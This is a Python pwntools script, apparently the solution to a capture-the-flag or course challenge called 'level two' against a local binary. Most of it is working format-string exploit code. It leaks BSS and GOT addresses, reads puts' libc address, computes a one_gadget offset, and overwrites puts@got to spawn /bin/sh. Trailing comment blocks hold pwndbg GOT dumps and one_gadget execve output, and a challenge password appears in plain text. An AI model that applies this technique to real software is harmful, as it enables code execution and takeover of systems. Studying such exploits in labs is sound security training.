

# solve_level_two.py

from pwn import *
from n4t20_lib import *
from time import sleep
import os
import subprocess

local = True

if local:
    p = process('./binary_7')

e = ELF('./binary_7')

#password = "c43277249e73244ed4ec051363fac62d";
password = "9aba2d78b49a6af39c13fdbd03627a72"
p.recvuntil("> ")
p.send(password + "\n");
#p.interactive()
p.recvuntil("Proceeding to the challenge...")
p.recvuntil("> ")



# The following is the actual solution for a single challenge, first done manually.

# Want to write: 0804935b
# To this address:
exit_address = e.got['exit']
print("exit_address = " + hex(exit_address))
#print(hex(e.got['exit']))
#payload = b''
#for i in range(20):
#    payload += b"A"*2+str(i).encode()+b" "
#payload += b"%p "*20
#p.send(payload + b"\n")
'''
AA0 AA1 AA2 AA3 AA4 AA5 AA6 AA7 AA8 AA9 AA10 AA11 AA12 AA13 AA14 AA15 AA16 AA17 AA18 AA19 0x190 0xf7f8e580 0x8049562 0x20304141
'''

#def compute_field_32_bit(byte_to_write, payload_length_so_far, target_parameter_number):
    

#payload_length = 0
#payload = b''
#payload += b"A"*68
##payload = b"JUN "*3
##payload += b"%23$pAA "
##payload += b"%24$pAA "
##payload += b"%25$pAA "
##payload += b"%26$pAA "
##payload += b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
#payload += b"IIIIJJJJKKKKLLLL"
##payload += p32(exit_address)
##payload += p32(exit_address+1)
##payload += p32(exit_address+2)
##payload += p32(exit_address+3)
#payload += b"\n"

# buf_length = 76

'''
def retrieve_function_addr(binary_name, function_name):
    cmd = b"readelf -s ./" + binary_name +  b"| grep " + function_name
    test = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    #test = subprocess.Popen(["readelf", "-s", "./level_one", "|", "grep", "win"], stdout=subprocess.PIPE)
    #test = subprocess.Popen(["ls", "-lah"], stdout=subprocess.PIPE)
    tmp = test.stdout.read()
    #print("result of system call = " + str(tmp))
    #print(str(tmp).__class__)
    addr =  tmp.strip().split(b" ")[1]
    #print("addr = " + str(addr))
    addr = b'0x' + addr
    #print("addr = " + str(addr))
    addr = int(addr,16)
    #print("addr = " + str(addr))
    return addr
'''
#win_addr = retrieve_function_addr(b"level_one", b"win")
#print("addr = " + str(win_addr))
#print("    which in hex = " + hex(win_addr))
#win_addr = 0x4012d0
#src = 0x0804935b
print("type of exit_address = " + str(exit_address.__class__))
#dst = exit_address
#dpn = 23
#buf_length = 76

#payload = b"A"*120 + b"B"*8 + b"%21$p" + b"\n"

payload = b"%7$p %8$p"

# Offset to exit: 0x6c


#payload = gen_x86_64_fmt_string(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
#payload = gen_fmt_string_write_exploit_x86_64(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
#payload += b"\n"
print("payload = " + str(payload))
print("payload class = " + str(payload.__class__))

#sleep(20)
## Report 1: Leak BSS addresses and get GOT addresses
p.send(payload + b"\n")
#p.interactive()
p.recvuntil("Report 1:\n")
tmp = p.recvline().strip().split(b' ')[0]
report_number_addr = int(tmp,16)
print("report_number address = " + hex(report_number_addr))

puts_got_addr = report_number_addr - 0xb4
fgets_got_addr = report_number_addr - 0x84

print("puts GOT address = " + hex(puts_got_addr))
print("fgets GOT address = " + hex(fgets_got_addr))

## Report 2: Leak GOT addresses.
p.recvuntil("> ")
#p.send(b"%9$pAAAA" + b"BBBBBBBB" +  b"\n")

payload = b"%10$s A %12$s BB" + p64(fgets_got_addr) + b"CCCCCCCC" + p64(puts_got_addr)
payload = b"%9$s AA " + p64(puts_got_addr)# + b"CCCCCCCC" + p64(puts_got_addr)
print(b"Payload 2 = " + payload)
p.send(payload + b"\n")
p.recvuntil("Report 2:\n")

#p.interactive()
tmp = p.recvline().strip().split(b' ')
print("tmp = " + str(tmp))
#payload = gen_x86_64_fmt_string(src=win_addr, dst=exit_address, dpn=21, buf_length=120)
#p.interactive()
def libc_bytes_to_libc_addr(s):
    s += b'\x00'*(8-len(s))
    return u64(s)
#fgets_libc_addr = libc_bytes_to_libc_addr(tmp[0])
puts_libc_addr = libc_bytes_to_libc_addr(tmp[0])

#print("fgets libc addr: " + hex(fgets_libc_addr))
print("puts libc addr: " + hex(puts_libc_addr))
#gen_fmt_string_write_exploit_x86

## Report 3: Leak LIBC address.
p.recvuntil("> ")
# Let's try overwriting exit(0) first.
#p.interactive()
if local:
    puts_libc_offset = 0x875a0
    libc_base_addr = puts_libc_addr - puts_libc_offset  
    one_gadget_addr = libc_base_addr + 0xe6c81
    print("one_gadget address = " + hex(one_gadget_addr))

payload = b"%12$p A "+b"A"*24 + b"BBBBBBBB" + b"\n"
print(b"payload = " + payload)
payload = gen_x86_64_fmt_string(src=one_gadget_addr, dst=puts_got_addr, dpn=12, buf_length=32)
#print(b"Round 3 payload = " + payload)
#sleep(20)
p.send(payload + b"\n")
#payload = b"%9$p AA " + b"BBBBBBBB"
p.interactive()

'''
pwndbg> x /10xg 0x55df894ce8dc - 0xb4
0x55df894ce828 <puts@got.plt>:  0x00007fad5910e5a0  0x00007fad5910bf50
0x55df894ce838 <__stack_chk_fail@got.plt>:  0x00007fad591b9b00  0x00007fad590dc410
0x55df894ce848 <printf@got.plt>:    0x00007fad590ebe10  0x00007fad591155a0
0x55df894ce858 <fgets@got.plt>: 0x00007fad5910c7b0  0x00007fad5910c4c0
0x55df894ce868 <fopen@got.plt>: 0x00007fad5910ca90  0x00007fad590d0bc0
pwndbg> x /10xg 0x55df894ce8dc - 0xbc
0x55df894ce820 <putchar@got.plt>:   0x00007fad59110400  0x00007fad5910e5a0
0x55df894ce830 <fclose@got.plt>:    0x00007fad5910bf50  0x00007fad591b9b00
0x55df894ce840 <system@got.plt>:    0x00007fad590dc410  0x00007fad590ebe10
0x55df894ce850 <fgetc@got.plt>: 0x00007fad591155a0  0x00007fad5910c7b0
0x55df894ce860 <fflush@got.plt>:    0x00007fad5910c4c0  0x00007fad5910ca90
'''

'''
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''